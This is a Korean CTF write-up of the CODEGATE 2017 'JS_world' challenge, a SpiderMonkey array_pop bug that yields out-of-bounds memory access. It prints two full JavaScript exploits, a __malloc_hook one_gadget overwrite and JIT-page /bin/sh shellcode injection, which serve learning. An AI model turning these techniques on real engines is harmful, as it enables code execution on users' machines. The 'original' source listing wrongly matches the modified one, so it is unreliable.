---
title: CODEGATE 2017 - JS_world
categories:
 - pwnable
tags: javascript_engine, javascript, browser, pwn, compiler
---

목차:

- Intruction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점
- Reference


## Introduction

처음 접해보는 javascript engine 취약점 문제였다. chrome, IE, firefox같은 browser에서 해당 engine을 사용하기 때문에 항상 말로만 듣던 browser exploit을 CTF문제로 접하게 되서 당황 반 호기심 반으로 문제를 풀었다.

결론만 말하자면 문제의 취약점은 발견했지만 exploit까지는 가질 못해서 롸업을 보고 문제를 풀었다.

확실히 처음 접하는 플랫폼이다보니 쫌... 많이 ^^ 생소했다..

이 문제 덕분에 browser에 새끼발가락 정도는 걸치게 된것같아서 기쁘다. :smile:

롸업은

```
https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/
https://pwn3r.tistory.com/entry/CODEGATE-2017-QUAL-jsworld
https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/2017_codegate_js_world/
```

을 참고했다. 특히 첫 번째 블로그에서 출제자 입장에서의 문제풀이를 보니까 일반적인 롸업이랑은 조금 다른 느낌을 받았다. 문제를 낸 이유와 과정들이 담겨있다보니 색달랐다. 아무튼 그랬다. ㅎㅎ;


## Vunlnerability


Original jsarray.cpp
```c++
JSBool
js::array_pop(JSContext *cx, unsigned argc, Value *vp)
{
    CallArgs args = CallArgsFromVp(argc, vp);

    /* Step 1. */
    RootedObject obj(cx, ToObject(cx, args.thisv()));
    if (!obj)
        return false;

    /* Steps 2-3. */
    uint32_t index;
    if (!GetLengthProperty(cx, obj, &index))
        return false;

    /* Steps 4-5. */

        /* Step 5a. */
        index--;

        /* Step 5b, 5e. */
        JSBool hole;
        if (!GetElement(cx, obj, index, &hole, args.rval()))
            return false;

        /* Step 5c. */
        if (!hole && !DeletePropertyOrThrow(cx, obj, index))
            return false;


    // Keep dense initialized length optimal, if possible.  Note that this just
    // reflects the possible deletion above: in particular, it's okay to do
    // this even if the length is non-writable and SetLengthProperty throws.
    if (obj->isNative())
        obj->setDenseInitializedLength(index);

    /* Steps 4a, 5d. */
    return SetLengthProperty(cx, obj, index);
}
```

CTF에서 제공된 수정된 jsarray.cpp

```c++
JSBool
js::array_pop(JSContext *cx, unsigned argc, Value *vp)
{
    CallArgs args = CallArgsFromVp(argc, vp);

    /* Step 1. */
    RootedObject obj(cx, ToObject(cx, args.thisv()));
    if (!obj)
        return false;

    /* Steps 2-3. */
    uint32_t index;
    if (!GetLengthProperty(cx, obj, &index))
        return false;

    /* Steps 4-5. */

        /* Step 5a. */
        index--;

        /* Step 5b, 5e. */
        JSBool hole;
        if (!GetElement(cx, obj, index, &hole, args.rval()))
            return false;

        /* Step 5c. */
        if (!hole && !DeletePropertyOrThrow(cx, obj, index))
            return false;


    // Keep dense initialized length optimal, if possible.  Note that this just
    // reflects the possible deletion above: in particular, it's okay to do
    // this even if the length is non-writable and SetLengthProperty throws.
    if (obj->isNative())
        obj->setDenseInitializedLength(index);

    /* Steps 4a, 5d. */
    return SetLengthProperty(cx, obj, index);
}
```

mozila javascript engine 다운로드 받는 방법과 같이 환경 세팅하는 부분은 레퍼런스를 참고하면 되겠다. 필자도 포스팅하려고 했지만 다른 포스팅들이 너무 설명을 잘해놔서 ~~의욕이 사라져서~~ 할 필요가 없을것 같다.


```
cpp
1947c1947,1950
<
---
>     //if (index == 0) {
>         /* Step 4b. */
>         //args.rval().setUndefined();
>     //} else {
1959c1962
<
---
>     //}
1964c1967
<     if (obj->isNative())
---
>     if (obj->isNative())// && obj->getDenseInitializedLength() > index)
```

수정된 버전, 즉 CTF에서 제공된 cpp에서 배열에서 호출하는 pop 함수에서 index가 0일때 체크하는 부분을 없애버렸다. (인위적으로 취약점 만듬)

이를 통해서 빈 배열일때 pop()을 실행하면 length가 integer overflow가 되면서 0 -> 2^32-1 이 되버려서 OOB Write와 OOB Read가 가능해진다.


## Exploit

leak을 위해서 double data 형태로 나오는 값을 memory data로 치환하는 방법이나 javascript engine의 기본수행 동작, jit과 같은 것들에 대해서는 레퍼런스를 참조하면 되겠다.

레퍼런스에서 거의 전부를 설명하고 있기 때문에 exploit을 진행하면서 막혔던 부분과 헤맸던 몇 가지 부분만 언급하도록 하겠다.

방법은 두가지 정도가 있었는데 첫 번째는 평소에 하던대로 one_gadget을 이용해 `__malloc_hook`을 덮어쓰는 방법이 있고 두 번째는 jit address에 shellcode를 박는 방법이 있다.

풀이로는 둘다 시도해봤었고 개인적으로는 첫 번째가 좀 더 쉬웠지만 두 번째 방법은 libc leak이 필요없다는 점에서 더 좋은 것 같다. (출제자도 이 방법으로 풀기를 원했었고.. 블로그 참조)


위에서 pop으로 length overflow가 된 배열이 OOB write & read가 가능하긴 하지만 해당 객체가 있는 가상주소보다 아래에 위치해 있는 메모리는 읽거나 쓰질 못한다. (굳이 배열 하나를 더 선언하는 이유) 그래서 배열객체 하나를 더 선언해서 해당 객체의 header 부분의 length를 토대로 객체의 위치를 찾는다. 그 후 객체가 가리키는 포인터를 overwrite해서 overwrite된 객체를 이용해 OOB write와 read를 수행하게 된다.

이렇게 해서 jit address에 shellcode를 넣거나 `__malloc_hook`에 one_gadget을 넣으면 되겠다.



## slv.py

glibc 2.19에서 진행했다.

### __malloc_hook overwrite

```javascript

function itod(data){
    var buffer = new ArrayBuffer(8);
    var f = new Float64Array(buffer);
    var byte = new Uint8Array(buffer, 0, 8);

    var str = ('0000000000000000' + data.toString(16)).substr(-16,16);

    for (var i =0; i<8; i++){
        byte[i] = parseInt(str.substr(-2-(2*i),2),16);
    }

    return f[0];

}

function dtoi(data){
    var buffer = new ArrayBuffer(8);
    var f = new Float64Array(buffer);
    var byte = new Uint8Array(buffer, 0, 8);

    f[0] = data;

    var ret='0x';

    for(var i = 0; i<8; i++){
        ret += ('00'+byte[byte.length-1-i].toString(16)).substr(-2,2);
    }

    return ret;

    
}

function hex(data){
    return '0x' + data.toString(16);    
}

function read(addr){
	a[a2_index+3] = itod(addr)
	return hex(a2[1]*0x100000000 + a2[0])
}

function write(addr, data){
	a[a2_index+3] = itod(addr)
	
	var str_data = ('0000000000000000' + data.toString(16)).substr(-16,16);
	var low_addr = str_data.substring(0, 8)
	var high_addr = str_data.substring(8,16)
	

	a2[1] = parseInt(low_addr, 16)
	a2[0] = parseInt(high_addr, 16)
	
	return
}

a = new Array(1);
a.pop();
a.pop();
a2 = new Uint32Array(0x900);


for (var i = 0; a[i] != 0x900; i++)
a2_index = i;//3806

for (var i =a2_index; i<a2_index+10; i++)
	print(dtoi(a[i]))
//var heap_base = parseInt(dtoi(a[a2_index+3]), 16) - 0xa6680
var libc_mmap_base = parseInt(dtoi(a[100003]), 16) - 0x106450 - 0x80
var pie_base = parseInt(dtoi(a[a2_index+7]), 16) - 0x796a70

//print("heap_base : " + hex(heap_base))
print("libc_mmap_base : " + hex(libc_mmap_base))

print("pie_base : " + hex(pie_base))

var print_got_addr = read(pie_base + 0x78bb18)
print("print_got_addr : " + hex(pie_base + 0x78bb18))
var libc_base = print_got_addr - 0x10ce70

print("libc_base : " + hex(libc_base))

var malloc_hook_addr = libc_base + 0x3c2740
print("malloc_hook_addr : " + hex(malloc_hook_addr))

var one_gadget = [0x46428, 0x4647c, 0xe9415, 0xea36d]
var one_gadget_addr = libc_base + one_gadget[2]


write(malloc_hook_addr, one_gadget_addr)

readline()

```



### jit_address overwrite

```javascript
function itod(data){
    var buffer = new ArrayBuffer(8);
    var f = new Float64Array(buffer);
    var byte = new Uint8Array(buffer, 0, 8);

    var str = ('0000000000000000' + data.toString(16)).substr(-16,16);

    for (var i =0; i<8; i++){
        byte[i] = parseInt(str.substr(-2-(2*i),2),16);
    }

    return f[0];

}

function dtoi(data){
    var buffer = new ArrayBuffer(8);
    var f = new Float64Array(buffer);
    var byte = new Uint8Array(buffer, 0, 8);

    f[0] = data;

    var ret='0x';

    for(var i = 0; i<8; i++){
        ret += ('00'+byte[byte.length-1-i].toString(16)).substr(-2,2);
    }

    return ret;

    
}

function hex(data){
    return '0x' + data.toString(16);    
}

function read(addr){
	
	a[a2_index+3] = itod(addr)
	
	return hex(a2[1]*0x100000000 + a2[0])
}

function write(addr, data){
	a[a2_index+3] = itod(addr)
	
	var str_data = ('0000000000000000' + data.toString(16)).substr(-16,16);
	var low_addr = str_data.substring(0, 8)
	var high_addr = str_data.substring(8,16)
	

	a2[1] = parseInt(low_addr, 16)
	a2[0] = parseInt(high_addr, 16)
	
	return
}



a = new Array(1);

a.pop();
a.pop();

a2 = new Uint32Array(0x900);

a2[0]='0x61616161';
a2[1]='0x62626262';
a2[2]='0x63636363';



for(var i = 0; a[i] != 0x900; i++)
	a2_index = i;


function trigger(){	
	print('trigger!')
}

for(var i=0; i<0x40; i++)
	trigger();


libc_mmap_base = dtoi(a[100003]) - 0x106510 -0x40-0x3240-0x1e00
print('libc_mmap_base : ' + hex(libc_mmap_base))
print('a2_array\'s pointer : ' + hex(libc_mmap_base + 0x4b638))

for (var i = libc_mmap_base+0x4e000; i<0x4f000+libc_mmap_base; i+=8 ){
	read_value = read(i)
		
	if(read_value == 0x15000000161){
		function_addr = i-16;	
		break
	}
	
}

print('function_addr : ' + hex(function_addr))

jit_addr = read(function_addr)

print('jit_addr : ' + jit_addr)


shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

function insert_shellcode(){

	padding_num = 4 - (shellcode.length % 4)
	shellcode += '\x90' * padding_num
	
	a[a2_index+3] = itod(jit_addr)
	
	for (var i=0; i < shellcode.length; i+=4){
		
		payload = 0
		
		for ( var j =0; j<4; j++){
			payload += shellcode.charCodeAt(i+j) << (8*j)
		}
		
		a2[i/4] = payload		
	
	}	
}

insert_shellcode();

trigger();

```

jit address 이용할때 trigger과 같이 반복할 함수를 먼저 반복호출을 수행하고 찾아야 된다.. 여기서 바보같이 삽질했었다.



## 느낀 점

- python이 아닌 다른 언어로 exploit을 짠게 처음이라 되게 신기했다.
- 지수 표현을 memory data로 치환하는 방법을 알게됨.
- javascript engine에 대해 조금이나마 알게됨.(jit, js_object, etc ..)
- 관련 문서를 읽어봐야겠다는 생각.


## Reference

```
https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/
https://pwn3r.tistory.com/entry/CODEGATE-2017-QUAL-jsworld
https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/2017_codegate_js_world/
```

:smile::smile::smile: